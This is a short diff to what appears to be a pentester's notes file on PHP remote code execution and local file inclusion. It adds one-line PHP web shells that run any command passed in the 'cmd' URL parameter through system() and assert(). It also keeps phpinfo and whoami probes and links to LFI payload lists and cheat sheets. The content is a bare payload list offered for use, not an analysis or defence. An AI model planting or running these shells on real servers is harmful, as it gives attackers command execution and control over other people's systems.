@@ -1,7 +1,12 @@
+RCE
 <?php phpinfo()?>
 <?php echo shell_exec(whoami);?>
-<?php system($_GET['cmd']); ?>
 
+SHELL
+<?php system($_GET['cmd']); ?>
+<?php echo assert($_GET['cmd']);?>
+
+LINKS
 https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
 https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
 https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method
